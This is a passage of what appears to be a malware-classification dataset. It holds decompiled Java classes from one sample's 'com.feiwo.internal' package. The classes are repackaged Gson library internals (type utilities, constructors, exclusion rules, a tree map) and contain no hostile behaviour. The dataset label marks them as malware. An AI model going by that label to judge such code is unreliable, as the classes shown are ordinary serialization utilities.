C$Gson$Types.equals(this,(WildcardType)obj);     }     @Override public Type[] getLowerBounds(){       return this.lowerBound != null ? new Type[]{this.lowerBound} : C$Gson$Types.EMPTY_TYPE_ARRAY;     }     @Override public Type[] getUpperBounds(){       return new Type[]{this.upperBound};     }     public int hashCode(){       return (this.lowerBound != null ? this.lowerBound.hashCode() + 31 : 1) ^ (this.upperBound.hashCode() + 31);     }     public String toString(){       return this.lowerBound != null ? ""? super "" + C$Gson$Types.typeToString(this.lowerBound) : this.upperBound == Object.class ? ""?"" : ""? extends "" + C$Gson$Types.typeToString(this.upperBound);     }   }   private C$Gson$Types(){   }   public static GenericArrayType arrayOf(  Type type){     return new GenericArrayTypeImpl(type);   }   public static Type canonicalize(  Type type){     if (type instanceof Class) {       Class cls=(Class)type;       return cls.isArray() ? new GenericArrayTypeImpl(canonicalize(cls.getComponentType())) : cls;     }     if (type instanceof ParameterizedType) {       ParameterizedType parameterizedType=(ParameterizedType)type;       return new ParameterizedTypeImpl(parameterizedType.getOwnerType(),parameterizedType.getRawType(),parameterizedType.getActualTypeArguments());     }     if (type instanceof GenericArrayType) {       return new GenericArrayTypeImpl(((GenericArrayType)type).getGenericComponentType());     }     if (!(type instanceof WildcardType)) {       return type;     }     WildcardType wildcardType=(WildcardType)type;     return new WildcardTypeImpl(wildcardType.getUpperBounds(),wildcardType.getLowerBounds());   }   public static void checkNotPrimitive(  Type type){     C$Gson$Preconditions.checkArgument(((type instanceof Class) && ((Class)type).isPrimitive()) ? false : true);   }   private static Class<?> declaringClassOf(  TypeVariable<?> typeVariable){     Object genericDeclaration=typeVariable.getGenericDeclaration();     if (genericDeclaration instanceof Class) {       return (Class)genericDeclaration;     }     return null;   }   static boolean equal(  Object obj,  Object obj2){     return obj == obj2 || (obj != null && obj.equals(obj2));   }   public static boolean equals(  Type type,  Type type2){     if (type == type2) {       return true;     }     if (type instanceof Class) {       return type.equals(type2);     }     if (type instanceof ParameterizedType) {       if (!(type2 instanceof ParameterizedType)) {         return false;       }       ParameterizedType parameterizedType=(ParameterizedType)type;       ParameterizedType parameterizedType2=(ParameterizedType)type2;       return equal(parameterizedType.getOwnerType(),parameterizedType2.getOwnerType()) && parameterizedType.getRawType().equals(parameterizedType2.getRawType()) && Arrays.equals(parameterizedType.getActualTypeArguments(),parameterizedType2.getActualTypeArguments());     }     if (type instanceof GenericArrayType) {       if (type2 instanceof GenericArrayType) {         return equals(((GenericArrayType)type).getGenericComponentType(),((GenericArrayType)type2).getGenericComponentType());       }       return false;     }     if (type instanceof WildcardType) {       if (!(type2 instanceof WildcardType)) {         return false;       }       WildcardType wildcardType=(WildcardType)type;       WildcardType wildcardType2=(WildcardType)type2;       return Arrays.equals(wildcardType.getUpperBounds(),wildcardType2.getUpperBounds()) && Arrays.equals(wildcardType.getLowerBounds(),wildcardType2.getLowerBounds());     }     if (!(type instanceof TypeVariable) || !(type2 instanceof TypeVariable)) {       return false;     }     TypeVariable typeVariable=(TypeVariable)type;     TypeVariable typeVariable2=(TypeVariable)type2;     return typeVariable.getGenericDeclaration() == typeVariable2.getGenericDeclaration() && typeVariable.getName().equals(typeVariable2.getName());   }   public static Type getArrayComponentType(  Type type){     return type instanceof GenericArrayType ? ((GenericArrayType)type).getGenericComponentType() : ((Class)type).getComponentType();   }   public static Type getCollectionElementType(  Type type,  Class<?> cls){     Type supertype=getSupertype(type,cls,Collection.class);     if (supertype instanceof WildcardType) {       supertype=((WildcardType)supertype).getUpperBounds()[0];     }     return supertype instanceof ParameterizedType ? ((ParameterizedType)supertype).getActualTypeArguments()[0] : Object.class;   }   static Type getGenericSupertype(  Type type,  Class<?> cls,  Class<?> cls2){     if (cls2 == cls) {       return type;     }     if (cls2.isInterface()) {       Class<?>[] interfaces=cls.getInterfaces();       int length=interfaces.length;       for (int i=0; i < length; i++) {         if (interfaces[i] == cls2) {           return cls.getGenericInterfaces()[i];         }         if (cls2.isAssignableFrom(interfaces[i])) {           return getGenericSupertype(cls.getGenericInterfaces()[i],interfaces[i],cls2);         }       }     }     if (!cls.isInterface()) {       while (cls != Object.class) {         Class<? super Object> superclass=cls.getSuperclass();         if (superclass == cls2) {           return cls.getGenericSuperclass();         }         if (cls2.isAssignableFrom(superclass)) {           return getGenericSupertype(cls.getGenericSuperclass(),superclass,cls2);         }         cls=superclass;       }     }     return cls2;   }   public static Type[] getMapKeyAndValueTypes(  Type type,  Class<?> cls){     if (type == Properties.class) {       return new Type[]{String.class,String.class};     }     Type supertype=getSupertype(type,cls,Map.class);     return supertype instanceof ParameterizedType ? ((ParameterizedType)supertype).getActualTypeArguments() : new Type[]{Object.class,Object.class};   }   public static Class<?> getRawType(  Type type){     if (type instanceof Class) {       return (Class)type;     }     if (type instanceof ParameterizedType) {       Type rawType=((ParameterizedType)type).getRawType();       C$Gson$Preconditions.checkArgument(rawType instanceof Class);       return (Class)rawType;     }     if (type instanceof GenericArrayType) {       return Array.newInstance(getRawType(((GenericArrayType)type).getGenericComponentType()),0).getClass();     }     if (type instanceof TypeVariable) {       return Object.class;     }     if (type instanceof WildcardType) {       return getRawType(((WildcardType)type).getUpperBounds()[0]);     }     throw new IllegalArgumentException(""Expected a Class, ParameterizedType, or GenericArrayType, but <"" + type + ""> is of type ""+ (type == null ? ""null"" : type.getClass().getName()));   }   static Type getSupertype(  Type type,  Class<?> cls,  Class<?> cls2){     C$Gson$Preconditions.checkArgument(cls2.isAssignableFrom(cls));     return resolve(type,cls,getGenericSupertype(type,cls,cls2));   }   public static int hashCodeOrZero(  Object obj){     if (obj != null) {       return obj.hashCode();     }     return 0;   }   private static int indexOf(  Object[] objArr,  Object obj){     for (int i=0; i < objArr.length; i++) {       if (obj.equals(objArr[i])) {         return i;       }     }     throw new NoSuchElementException();   }   public static ParameterizedType newParameterizedTypeWithOwner(  Type type,  Type type2,  Type... typeArr){     return new ParameterizedTypeImpl(type,type2,typeArr);   }   public static Type resolve(  Type type,  Class<?> cls,  Type type2){     Type resolve;     TypeVariable typeVariable;     do {       Type type3=type2;       if (!(type3 instanceof TypeVariable)) {         if ((type3 instanceof Class) && ((Class)type3).isArray()) {           Class cls2=(Class)type3;           Class<?> componentType=cls2.getComponentType();           Type resolve2=resolve(type,cls,componentType);           return componentType != resolve2 ? arrayOf(resolve2) : cls2;         }         if (type3 instanceof GenericArrayType) {           GenericArrayType genericArrayType=(GenericArrayType)type3;           Type genericComponentType=genericArrayType.getGenericComponentType();           Type resolve3=resolve(type,cls,genericComponentType);           return genericComponentType != resolve3 ? arrayOf(resolve3) : genericArrayType;         }         if (!(type3 instanceof ParameterizedType)) {           if (!(type3 instanceof WildcardType)) {             return type3;           }           WildcardType wildcardType=(WildcardType)type3;           Type[] lowerBounds=wildcardType.getLowerBounds();           Type[] upperBounds=wildcardType.getUpperBounds();           if (lowerBounds.length != 1) {             return (upperBounds.length != 1 || (resolve=resolve(type,cls,upperBounds[0])) == upperBounds[0]) ? wildcardType : subtypeOf(resolve);           }           Type resolve4=resolve(type,cls,lowerBounds[0]);           return resolve4 != lowerBounds[0] ? supertypeOf(resolve4) : wildcardType;         }         ParameterizedType parameterizedType=(ParameterizedType)type3;         Type ownerType=parameterizedType.getOwnerType();         Type resolve5=resolve(type,cls,ownerType);         boolean z=resolve5 != ownerType;         Type[] actualTypeArguments=parameterizedType.getActualTypeArguments();         int length=actualTypeArguments.length;         boolean z2=z;         Type[] typeArr=actualTypeArguments;         for (int i=0; i < length; i++) {           Type resolve6=resolve(type,cls,typeArr[i]);           if (resolve6 != typeArr[i]) {             if (!z2) {               typeArr=(Type[])typeArr.clone();               z2=true;             }             typeArr[i]=resolve6;           }         }         return z2 ? newParameterizedTypeWithOwner(resolve5,parameterizedType.getRawType(),typeArr) : parameterizedType;       }       typeVariable=(TypeVariable)type3;       type2=resolveTypeVariable(type,cls,typeVariable);     }  while (type2 != typeVariable);     return type2;   }   static Type resolveTypeVariable(  Type type,  Class<?> cls,  TypeVariable<?> typeVariable){     Class<?> declaringClassOf=declaringClassOf(typeVariable);     if (declaringClassOf == null) {       return typeVariable;     }     Type genericSupertype=getGenericSupertype(type,cls,declaringClassOf);     if (!(genericSupertype instanceof ParameterizedType)) {       return typeVariable;     }     return ((ParameterizedType)genericSupertype).getActualTypeArguments()[indexOf(declaringClassOf.getTypeParameters(),typeVariable)];   }   public static WildcardType subtypeOf(  Type type){     return new WildcardTypeImpl(new Type[]{type},EMPTY_TYPE_ARRAY);   }   public static WildcardType supertypeOf(  Type type){     return new WildcardTypeImpl(new Type[]{Object.class},new Type[]{type});   }   public static String typeToString(  Type type){     return type instanceof Class ? ((Class)type).getName() : type.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\ConstructorConstructor.code","public final class ConstructorConstructor {   private final Map<Type,InstanceCreator<?>> instanceCreators;   public ConstructorConstructor(  Map<Type,InstanceCreator<?>> map){     this.instanceCreators=map;   }   private <T>ObjectConstructor<T> newDefaultConstructor(  Class<? super T> cls){     try {       final Constructor<? super T> declaredConstructor=cls.getDeclaredConstructor(new Class[0]);       if (!declaredConstructor.isAccessible()) {         declaredConstructor.setAccessible(true);       }       return new ObjectConstructor<T>(){         @Override public T construct(){           try {             return (T)declaredConstructor.newInstance(null);           }  catch (          IllegalAccessException e) {             throw new AssertionError(e);           } catch (          InstantiationException e2) {             throw new RuntimeException(""Failed to invoke "" + declaredConstructor + "" with no args"",e2);           } catch (          InvocationTargetException e3) {             throw new RuntimeException(""Failed to invoke "" + declaredConstructor + "" with no args"",e3.getTargetException());           }         }       } ;     }  catch (    NoSuchMethodException e) {       return null;     }   }   private <T>ObjectConstructor<T> newDefaultImplementationConstructor(  final Type type,  Class<? super T> cls){     if (Collection.class.isAssignableFrom(cls)) {       return SortedSet.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new TreeSet();         }       }  : EnumSet.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           if (!(type instanceof ParameterizedType)) {             throw new JsonIOException(""Invalid EnumSet type: "" + type.toString());           }           Type type2=((ParameterizedType)type).getActualTypeArguments()[0];           if (type2 instanceof Class) {             return (T)EnumSet.noneOf((Class)type2);           }           throw new JsonIOException(""Invalid EnumSet type: "" + type.toString());         }       }  : Set.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedHashSet();         }       }  : Queue.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedList();         }       }  : new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new ArrayList();         }       } ;     }     if (Map.class.isAssignableFrom(cls)) {       return SortedMap.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new TreeMap();         }       }  : (!(type instanceof ParameterizedType) || String.class.isAssignableFrom(TypeToken.get(((ParameterizedType)type).getActualTypeArguments()[0]).getRawType())) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedTreeMap();         }       }  : new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedHashMap();         }       } ;     }     return null;   }   private <T>ObjectConstructor<T> newUnsafeAllocator(  final Type type,  final Class<? super T> cls){     return new ObjectConstructor<T>(){       private final UnsafeAllocator unsafeAllocator=UnsafeAllocator.create();       @Override public T construct(){         try {           return (T)this.unsafeAllocator.newInstance(cls);         }  catch (        Exception e) {           throw new RuntimeException(""Unable to invoke no-args constructor for "" + type + "". Register an InstanceCreator with Gson for this type may fix this problem."",e);         }       }     } ;   }   public <T>ObjectConstructor<T> get(  TypeToken<T> typeToken){     final Type type=typeToken.getType();     Class<? super T> rawType=typeToken.getRawType();     final InstanceCreator<?> instanceCreator=this.instanceCreators.get(type);     if (instanceCreator != null) {       return new ObjectConstructor<T>(){         @Override public T construct(){           return (T)instanceCreator.createInstance(type);         }       } ;     }     final InstanceCreator<?> instanceCreator2=this.instanceCreators.get(rawType);     if (instanceCreator2 != null) {       return new ObjectConstructor<T>(){         @Override public T construct(){           return (T)instanceCreator2.createInstance(type);         }       } ;     }     ObjectConstructor<T> newDefaultConstructor=newDefaultConstructor(rawType);     if (newDefaultConstructor != null) {       return newDefaultConstructor;     }     ObjectConstructor<T> newDefaultImplementationConstructor=newDefaultImplementationConstructor(type,rawType);     return newDefaultImplementationConstructor == null ? newUnsafeAllocator(type,rawType) : newDefaultImplementationConstructor;   }   public String toString(){     return this.instanceCreators.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\CurrentWrite.code","class CurrentWrite implements CharSequence {   char[] chars;   CurrentWrite(){   }   @Override public char charAt(  int i){     return this.chars[i];   }   @Override public int length(){     return this.chars.length;   }   @Override public CharSequence subSequence(  int i,  int i2){     return new String(this.chars,i,i2 - i);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\EntrySet.code","class EntrySet extends AbstractSet<Map.Entry<K,V>> {   EntrySet(){   }   @Override public void clear(){     LinkedTreeMap.this.clear();   }   @Override public boolean contains(  Object obj){     return (obj instanceof Map.Entry) && LinkedTreeMap.this.findByEntry((Map.Entry)obj) != null;   }   @Override public Iterator<Map.Entry<K,V>> iterator(){     return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<Map.Entry<K,V>>(){ {         LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;       }       @Override public Map.Entry<K,V> next(){         return nextNode();       }     } ;   }   @Override public boolean remove(  Object obj){     Node<K,V> findByEntry;     if (!(obj instanceof Map.Entry) || (findByEntry=LinkedTreeMap.this.findByEntry((Map.Entry)obj)) == null) {       return false;     }     LinkedTreeMap.this.removeInternal(findByEntry,true);     return true;   }   @Override public int size(){     return LinkedTreeMap.this.size;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\Excluder.code","public final class Excluder implements TypeAdapterFactory, Cloneable {   public static final Excluder DEFAULT=new Excluder();   private static final double IGNORE_VERSIONS=-1.0d;   private boolean requireExpose;   private double version=IGNORE_VERSIONS;   private int modifiers=136;   private boolean serializeInnerClasses=true;   private List<ExclusionStrategy> serializationStrategies=Collections.emptyList();   private List<ExclusionStrategy> deserializationStrategies=Collections.emptyList();   private boolean isAnonymousOrLocal(  Class<?> cls){     return !Enum.class.isAssignableFrom(cls) && (cls.isAnonymousClass() || cls.isLocalClass());   }   private boolean isInnerClass(  Class<?> cls){     return cls.isMemberClass() && !isStatic(cls);   }   private boolean isStatic(  Class<?> cls){     return (cls.getModifiers() & 8) != 0;   }   private boolean isValidSince(  Since since){     return since == null || since.value() <= this.version;   }   private boolean isValidUntil(  Until until){     return until == null || until.value() > this.version;   }   private boolean isValidVersion(  Since since,  Until until){     return isValidSince(since) && isValidUntil(until);   }   public Excluder m2clone(){     try {       return (Excluder)super.clone();     }  catch (    CloneNotSupportedException e) {       throw new AssertionError();     }   }   @Override public <T>TypeAdapter<T> create(  final Gson gson,  final TypeToken<T> typeToken){     Class<? super T> rawType=typeToken.getRawType();     final boolean excludeClass=excludeClass(rawType,true);     final boolean excludeClass2=excludeClass(rawType,false);     if (excludeClass || excludeClass2) {       return new TypeAdapter<T>(){         private TypeAdapter<T> delegate;         private TypeAdapter<T> delegate(){           TypeAdapter<T> typeAdapter=this.delegate;           if (typeAdapter != null) {             return typeAdapter;           }           TypeAdapter<T> delegateAdapter=gson.getDelegateAdapter(Excluder.this,typeToken);           this.delegate=delegateAdapter;           return delegateAdapter;         }         @Override public T read2(        JsonReader jsonReader){           if (!excludeClass2) {             return delegate().read2(jsonReader);           }           jsonReader.skipValue();           return null;         }         @Override public void write(        JsonWriter jsonWriter,        T t){           if (excludeClass) {             jsonWriter.nullValue();           }  else {             delegate().write(jsonWriter,t);           }         }       } ;     }     return null;   }   public Excluder disableInnerClassSerialization(){     Excluder m2clone=m2clone();     m2clone.serializeInnerClasses=false;     return m2clone;   }   public boolean excludeClass(  Class<?> cls,  boolean z){     if (this.version != IGNORE_VERSIONS && !isValidVersion((Since)cls.getAnnotation(Since.class),(Until)cls.getAnnotation(Until.class))) {       return true;     }     if ((this.serializeInnerClasses || !isInnerClass(cls)) && !isAnonymousOrLocal(cls)) {       Iterator<ExclusionStrategy> it=(z ? this.serializationStrategies : this.deserializationStrategies).iterator();       while (it.hasNext()) {         if (it.next().shouldSkipClass(cls)) {           return true;         }       }       return false;     }     return true;   }   public boolean excludeField(  Field field,  boolean z){     Expose expose;     if ((this.modifiers & field.getModifiers()) != 0) {       return true;     }     if ((this.version == IGNORE_VERSIONS || isValidVersion((Since)field.getAnnotation(Since.class),(Until)field.getAnnotation(Until.class))) && !field.isSynthetic()) {       if (this.requireExpose && ((expose=(Expose)field.getAnnotation(Expose.class)) == null || (!z ? expose.deserialize() : expose.serialize()))) {         return true;       }       if ((this.serializeInnerClasses || !isInnerClass(field.getType())) && !isAnonymousOrLocal(field.getType())) {         List<ExclusionStrategy> list=z ? this.serializationStrategies : this.deserializationStrategies;         if (!list.isEmpty()) {           FieldAttributes fieldAttributes=new FieldAttributes(field);           Iterator<ExclusionStrategy> it=list.iterator();           while (it.hasNext()) {             if (it.next().shouldSkipField(fieldAttributes)) {               return true;             }           }         }         return false;       }       return true;     }     return true;   }   public Excluder excludeFieldsWithoutExposeAnnotation(){     Excluder m2clone=m2clone();     m2clone.requireExpose=true;     return m2clone;   }   public Excluder withExclusionStrategy(  ExclusionStrategy exclusionStrategy,  boolean z,  boolean z2){     Excluder m2clone=m2clone();     if (z) {       m2clone.serializationStrategies=new ArrayList(this.serializationStrategies);       m2clone.serializationStrategies.add(exclusionStrategy);     }     if (z2) {       m2clone.deserializationStrategies=new ArrayList(this.deserializationStrategies);       m2clone.deserializationStrategies.add(exclusionStrategy);     }     return m2clone;   }   public Excluder withModifiers(  int... iArr){     Excluder m2clone=m2clone();     m2clone.modifiers=0;     for (    int i : iArr) {       m2clone.modifiers=i | m2clone.modifiers;     }     return m2clone;   }   public Excluder withVersion(  double d){     Excluder m2clone=m2clone();     m2clone.version=d;     return m2clone;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\GenericArrayTypeImpl.code","public final class GenericArrayTypeImpl implements Serializable, GenericArrayType {   private static final long serialVersionUID=0;   private final Type componentType;   public GenericArrayTypeImpl(  Type type){     this.componentType=C$Gson$Types.canonicalize(type);   }   public boolean equals(  Object obj){     return (obj instanceof GenericArrayType) && C$Gson$Types.equals(this,(GenericArrayType)obj);   }   @Override public Type getGenericComponentType(){     return this.componentType;   }   public int hashCode(){     return this.componentType.hashCode();   }   public String toString(){     return C$Gson$Types.typeToString(this.componentType) + ""[]"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\JsonReaderInternalAccess.code","public abstract class JsonReaderInternalAccess {   public static JsonReaderInternalAccess INSTANCE;   public abstract void promoteNameToValue(  JsonReader jsonReader); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\KeySet.code","class KeySet extends AbstractSet<K> {   KeySet(){   }   @Override public void clear(){     LinkedTreeMap.this.clear();   }   @Override public boolean contains(  Object obj){     return LinkedTreeMap.this.containsKey(obj);   }   @Override public Iterator<K> iterator(){     return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<K>(){ {         LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;       }       @Override public K next(){         return nextNode().key;       }     } ;   }   @Override public boolean remove(  Object obj){     return LinkedTreeMap.this.removeInternalByKey(obj) != null;   }   @Override public int size(){     return LinkedTreeMap.this.size;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\LazilyParsedNumber.code","public final class LazilyParsedNumber extends Number {   private final String value;   public LazilyParsedNumber(  String str){     this.value=str;   }   private Object writeReplace(){     return new BigDecimal(this.value);   }   @Override public double doubleValue(){     return Double.parseDouble(this.value);   }   @Override public float floatValue(){     return Float.parseFloat(this.value);   }   @Override public int intValue(){     try {       return Integer.parseInt(this.value);     }  catch (    NumberFormatException e) {       try {         return (int)Long.parseLong(this.value);       }  catch (      NumberFormatException e2) {         return new BigDecimal(this.value).intValue();       }     }   }   @Override public long longValue(){     try {       return Long.parseLong(this.value);     }  catch (    NumberFormatException e) {       return new BigDecimal(this.value).longValue();     }   }   public String toString(){     return this.value;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\LinkedTreeMap.code","public final class LinkedTreeMap<K,V> extends AbstractMap<K,V> implements Serializable {   static final boolean $assertionsDisabled;   private static final Comparator<Comparable> NATURAL_ORDER;   Comparator<? super K> comparator;   private LinkedTreeMap<K,V>.EntrySet entrySet;   final Node<K,V> header;   private LinkedTreeMap<K,V>.KeySet keySet;   int modCount;   Node<K,V> root;   int size; class EntrySet extends AbstractSet<Map.Entry<K,V>> {     EntrySet(){     }     @Override public void clear(){       LinkedTreeMap.this.clear();     }     @Override public boolean contains(    Object obj){       return (obj instanceof Map.Entry) && LinkedTreeMap.this.findByEntry((Map.Entry)obj) != null;     }     @Override public Iterator<Map.Entry<K,V>> iterator(){       return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<Map.Entry<K,V>>(){ {           LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;         }         @Override public Map.Entry<K,V> next(){           return nextNode();         }       } ;     }     @Override public boolean remove(    Object obj){       Node<K,V> findByEntry;       if (!(obj instanceof Map.Entry) || (findByEntry=LinkedTreeMap.this.findByEntry((Map.Entry)obj)) == null) {         return false;       }       LinkedTreeMap.this.removeInternal(findByEntry,true);       return true;     }     @Override public int size(){       return LinkedTreeMap.this.size;     }   } class KeySet extends AbstractSet<K> {     KeySet(){     }     @Override public void clear(){       LinkedTreeMap.this.clear();     }     @Override public boolean contains(    Object obj){       return LinkedTreeMap.this.containsKey(obj);     }     @Override public Iterator<K> iterator(){       return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<K>(){ {           LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;         }         @Override public K next(){           return nextNode().key;         }       } ;     }     @Override public boolean remove(    Object obj){       return LinkedTreeMap.this.removeInternalByKey(obj) != null;     }     @Override public int size(){       return LinkedTreeMap.this.size;     }   } public abstract class LinkedTreeMapIterator<T> implements Iterator<T> {     int expectedModCount;     Node<K,V> lastReturned;     Node<K,V> next;     private LinkedTreeMapIterator(){       this.next=LinkedTreeMap.this.header.next;       this.lastReturned=null;       this.expectedModCount=LinkedTreeMap.this.modCount;     }     @Override public final boolean hasNext(){       return this.next != LinkedTreeMap.this.header;     }     final Node<K,V> nextNode(){       Node<K,V> node=this.next;       if (node == LinkedTreeMap.this.header) {         throw new NoSuchElementException();       }       if (LinkedTreeMap.this.modCount != this.expectedModCount) {         throw new ConcurrentModificationException();       }       this.next=node.next;       this.lastReturned=node;       return node;     }     @Override public final void remove(){       if (this.lastReturned == null) {         throw new IllegalStateException();       }       LinkedTreeMap.this.removeInternal(this.lastReturned,true);       this.lastReturned=null;       this.expectedModCount=LinkedTreeMap.this.modCount;     }   } public final class Node<K,V> implements Map.Entry<K,V> {     int height;     final K key;     Node<K,V> left;     Node<K,V> next;     Node<K,V> parent;     Node<K,V> prev;     Node<K,V> right;     V value;     Node(){       this.key=null;       this.prev=this;       this.next=this;     }     Node(    Node<K,V> node,    K k,    Node<K,V> node2,    Node<K,V> node3){       this.parent=node;       this.key=k;       this.height=1;       this.next=node2;       this.prev=node3;       node3.next=this;       node2.prev=this;     }     @Override public boolean equals(    Object obj){       if (!(obj instanceof Map.Entry)) {         return false;       }       Map.Entry entry=(Map.Entry)obj;       if (this.key == null) {         if (entry.getKey() != null) {           return false;         }       }  else       if (!this.key.equals(entry.getKey())) {         return false;       }       if (this.value == null) {         if (entry.getValue() != null) {           return false;         }       }  else       if (!this.value.equals(entry.getValue())) {         return false;       }       return true;     }     public Node<K,V> first(){       for (Node<K,V> node=this.left; node != null; node=node.left) {         this=node;       }       return this;     }     @Override public K getKey(){       return this.key;     }     @Override public V getValue(){       return this.value;     }     @Override public int hashCode(){       return (this.key == null ? 0 : this.key.hashCode()) ^ (this.value != null ? this.value.hashCode() : 0);     }     public Node<K,V> last(){       for (Node<K,V> node=this.right; node != null; node=node.right) {         this=node;       }       return this;     }     @Override public V setValue(    V v){       V v2=this.value;       this.value=v;       return v2;     }     public String toString(){       return this.key + ""="" + this.value;     }   } static {     $assertionsDisabled=!LinkedTreeMap.class.desiredAssertionStatus();     NATURAL_ORDER=new Comparator<Comparable>(){       @Override public int compare(      Comparable comparable,      Comparable comparable2){         return comparable.compareTo(comparable2);       }     } ;   }   public LinkedTreeMap(){     this(NATURAL_ORDER);   }   public LinkedTreeMap(  Comparator<? super K> comparator){     this.size=0;     this.modCount=0;     this.header=new Node<>();     this.comparator=comparator == null ? NATURAL_ORDER : comparator;   }   private boolean equal(  Object obj,  Object obj2){     return obj == obj2 || (obj != null && obj.equals(obj2));   }   private void rebalance(  Node<K,V> node,  boolean z){     while (node != null) {       Node<K,V> node2=node.left;       Node<K,V> node3=node.right;       int i=node2 != null ? node2.height : 0;       int i2=node3 != null ? node3.height : 0;       int i3=i - i2;       if (i3 == -2) {         Node<K,V> node4=node3.left;         Node<K,V> node5=node3.right;         int i4=(node4 != null ? node4.height : 0) - (node5 != null ? node5.height : 0);         if (i4 == -1 || (i4 == 0 && !z)) {           rotateLeft(node);         }  else {           if (!$assertionsDisabled && i4 != 1) {             throw new AssertionError();           }           rotateRight(node3);           rotateLeft(node);         }         if (z) {           return;         }       }  else       if (i3 == 2) {         Node<K,V> node6=node2.left;         Node<K,V> node7=node2.right;         int i5=(node6 != null ? node6.height : 0) - (node7 != null ? node7.height : 0);         if (i5 == 1 || (i5 == 0 && !z)) {           rotateRight(node);         }  else {           if (!$assertionsDisabled && i5 != -1) {             throw new AssertionError();           }           rotateLeft(node2);           rotateRight(node);         }         if (z) {           return;         }       }  else       if (i3 == 0) {         node.height=i + 1;         if (z) {           return;         }       }  else {         if (!$assertionsDisabled && i3 != -1 && i3 != 1) {           throw new AssertionError();         }         node.height=Math.max(i,i2) + 1;         if (!z) {           return;         }       }       node=node.parent;     }   }   private void replaceInParent(  Node<K,V> node,  Node<K,V> node2){     Node<K,V> node3=node.parent;     node.parent=null;     if (node2 != null) {       node2.parent=node3;     }     if (node3 == null) {       this.root=node2;       return;     }     if (node3.left == node) {       node3.left=node2;     }  else {       if (!$assertionsDisabled && node3.right != node) {         throw new AssertionError();       }       node3.right=node2;     }   }   private void rotateLeft(  Node<K,V> node){     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node3.left;     Node<K,V> node5=node3.right;     node.right=node4;     if (node4 != null) {       node4.parent=node;     }     replaceInParent(node,node3);     node3.left=node;     node.parent=node3;     node.height=Math.max(node2 != null ? node2.height : 0,node4 != null ? node4.height : 0) + 1;     node3.height=Math.max(node.height,node5 != null ? node5.height : 0) + 1;   }   private void rotateRight(  Node<K,V> node){     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node2.left;     Node<K,V> node5=node2.right;     node.left=node5;     if (node5 != null) {       node5.parent=node;     }     replaceInParent(node,node2);     node2.right=node;     node.parent=node2;     node.height=Math.max(node3 != null ? node3.height : 0,node5 != null ? node5.height : 0) + 1;     node2.height=Math.max(node.height,node4 != null ? node4.height : 0) + 1;   }   private Object writeReplace(){     return new LinkedHashMap(this);   }   @Override public void clear(){     this.root=null;     this.size=0;     this.modCount++;     Node<K,V> node=this.header;     node.prev=node;     node.next=node;   }   @Override public boolean containsKey(  Object obj){     return findByObject(obj) != null;   }   @Override public Set<Map.Entry<K,V>> entrySet(){     LinkedTreeMap<K,V>.EntrySet entrySet=this.entrySet;     if (entrySet != null) {       return entrySet;     }     LinkedTreeMap<K,V>.EntrySet entrySet2=new EntrySet();     this.entrySet=entrySet2;     return entrySet2;   }   Node<K,V> find(  K k,  boolean z){     Node<K,V> node;     int i;     Node<K,V> node2;     Comparator<? super K> comparator=this.comparator;     Node<K,V> node3=this.root;     if (node3 != null) {       Comparable comparable=comparator == NATURAL_ORDER ? (Comparable)k : null;       while (true) {         int compareTo=comparable != null ? comparable.compareTo(node3.key) : comparator.compare(k,node3.key);         if (compareTo == 0) {           return node3;         }         Node<K,V> node4=compareTo < 0 ? node3.left : node3.right;         if (node4 == null) {           int i2=compareTo;           node=node3;           i=i2;           break;         }         node3=node4;       }     }  else {       node=node3;       i=0;     }     if (!z) {       return null;     }     Node<K,V> node5=this.header;     if (node != null) {       node2=new Node<>(node,k,node5,node5.prev);       if (i < 0) {         node.left=node2;       }  else {         node.right=node2;       }       rebalance(node,true);     }  else {       if (comparator == NATURAL_ORDER && !(k instanceof Comparable)) {         throw new ClassCastException(k.getClass().getName() + "" is not Comparable"");       }       node2=new Node<>(node,k,node5,node5.prev);       this.root=node2;     }     this.size++;     this.modCount++;     return node2;   }   Node<K,V> findByEntry(  Map.Entry<?,?> entry){     Node<K,V> findByObject=findByObject(entry.getKey());     if (findByObject != null && equal(findByObject.value,entry.getValue())) {       return findByObject;     }     return null;   }   Node<K,V> findByObject(  Object obj){     